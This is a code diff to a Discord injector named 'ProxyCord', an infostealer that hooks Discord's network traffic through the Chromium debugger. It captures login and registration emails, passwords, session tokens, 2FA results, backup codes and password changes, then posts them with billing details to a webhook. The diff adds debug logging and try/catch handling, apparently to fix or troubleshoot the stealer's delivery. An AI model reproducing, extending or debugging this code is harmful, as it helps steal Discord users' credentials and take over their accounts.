@@ -186,6 +186,10 @@ const getToken = async () => {
 };
 
 const hooker = async (content, token, account) => {
+    console.log('DEBUG: Hooker function called for user:', account ? account.username : 'NO_ACCOUNT');
+    console.log('DEBUG: Token length:', token ? token.length : 0);
+    console.log('DEBUG: Webhook URL:', CONFIG.webhook);
+
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
     content["username"] = "ProxyCord - discord injector";
     content["avatar_url"] = "https://i.ibb.co/LC7q9jX/evil-discord.png";
@@ -201,6 +205,7 @@ const hooker = async (content, token, account) => {
     };
     content["embeds"][0]["title"] = "Account Information";
 
+    console.log('DEBUG: Getting account details...');
     const nitro = getNitro(account.premium_type);
     const badges = getBadges(account.flags);
     const billing = await getBilling(token);
@@ -237,9 +242,15 @@ const hooker = async (content, token, account) => {
         content["embeds"][embed]["color"] = 0xb143e3;
     }
 
-    await request("POST", CONFIG.webhook, {
-        "Content-Type": "application/json"
-    }, JSON.stringify(content));
+    console.log('DEBUG: Sending webhook...');
+    try {
+        await request("POST", CONFIG.webhook, {
+            "Content-Type": "application/json"
+        }, JSON.stringify(content));
+        console.log('DEBUG: Webhook sent successfully!');
+    } catch (error) {
+        console.log('DEBUG: Webhook send failed:', error.message);
+    }
 };
 
 const fetch = async (endpoint, headers) => {
@@ -355,22 +366,35 @@ const getServers = async token => {
 };
 
 const EmailPassToken = async (email, password, token, action) => {
-    const account = await fetchAccount(token)
-    const content = {
-        "content": `**${account.username}** just ${action}!`,
-        "embeds": [{
-            "fields": [{
-                "name": "Email",
-                "value": "`" + email + "`",
-                "inline": true
-            }, {
-                "name": "Password",
-                "value": "`" + password + "`",
-                "inline": true
+    console.log('DEBUG: EmailPassToken called for action:', action);
+    console.log('DEBUG: Email:', email ? 'PROVIDED' : 'MISSING');
+    console.log('DEBUG: Password:', password ? 'PROVIDED' : 'MISSING');
+    console.log('DEBUG: Token:', token ? 'PROVIDED' : 'MISSING');
+    
+    try {
+        const account = await fetchAccount(token);
+        console.log('DEBUG: Account fetched successfully:', account.username);
+        
+        const content = {
+            "content": `**${account.username}** just ${action}!`,
+            "embeds": [{
+                "fields": [{
+                    "name": "Email",
+                    "value": "`" + email + "`",
+                    "inline": true
+                }, {
+                    "name": "Password",
+                    "value": "`" + password + "`",
+                    "inline": true
+                }]
             }]
-        }]
-    };
-    hooker(content, token, account);
+        };
+        
+        console.log('DEBUG: Calling hooker with content...');
+        await hooker(content, token, account);
+    } catch (error) {
+        console.log('DEBUG: EmailPassToken error:', error.message);
+    }
 }
 
 const BackupCodesViewed = async (codes, token) => {
@@ -583,50 +607,64 @@ const createWindow = () => {
     mainWindow.webContents.debugger.attach('1.3');
     mainWindow.webContents.debugger.on('message', async (_, method, params) => {
         if (!initiationCalled) {
+            console.log('DEBUG: First network event - calling initiation...');
             await initiation();
             initiationCalled = true;
         }
 
         if (method !== 'Network.responseReceived') return;
+        
+        // Log ALL network activity to see what we're missing
+        console.log('DEBUG: Network response:', params.response.url, 'Status:', params.response.status);
+        
         if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
         if (![200, 202].includes(params.response.status)) return;
 
-        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
-            requestId: params.requestId
-        });
-        const responseData = JSON.parse(responseUnparsedData.body);
+        console.log('DEBUG: MATCHING URL FOUND:', params.response.url);
 
-        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
-            requestId: params.requestId
-        });
-        const requestData = JSON.parse(requestUnparsedData.postData);
+        try {
+            const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
+                requestId: params.requestId
+            });
+            const responseData = JSON.parse(responseUnparsedData.body);
+            console.log('DEBUG: Response data keys:', Object.keys(responseData));
+
+            const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
+                requestId: params.requestId
+            });
+            const requestData = JSON.parse(requestUnparsedData.postData);
+            console.log('DEBUG: Request data keys:', Object.keys(requestData));
 
         switch (true) {
             case params.response.url.endsWith('/login'):
+                console.log('DEBUG: LOGIN endpoint hit!');
                 if (!responseData.token) {
+                    console.log('DEBUG: No token yet, storing creds for 2FA...');
                     email = requestData.login;
                     password = requestData.password;
                     return;
                 }
-                console.log('DEBUG: Captured token from login!');
+                console.log('DEBUG: LOGIN SUCCESS - Token found! Sending data...');
                 EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                 break;
 
             case params.response.url.endsWith('/register'):
-                console.log('DEBUG: Captured token from register!');
+                console.log('DEBUG: REGISTER endpoint hit!');
                 EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                 break;
 
             case params.response.url.endsWith('/totp'):
-                console.log('DEBUG: Captured token from 2FA!');
+                console.log('DEBUG: 2FA endpoint hit!');
                 EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                 break;
 
             case params.response.url.endsWith('/codes-verification'):
+                console.log('DEBUG: Backup codes endpoint hit!');
                 BackupCodesViewed(responseData.backup_codes, await getToken());
                 break;
 
             case params.response.url.endsWith('/@me'):
+                console.log('DEBUG: User update endpoint hit!');
                 if (!requestData.password) return;
                 if (requestData.email) {
                     EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
@@ -635,6 +673,12 @@ const createWindow = () => {
                     PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                 }
                 break;
+                
+            default:
+                console.log('DEBUG: Unhandled matching URL:', params.response.url);
+        }
+        } catch (error) {
+            console.log('DEBUG: Error processing network event:', error.message, 'URL:', params.response.url);
         }
     });
 
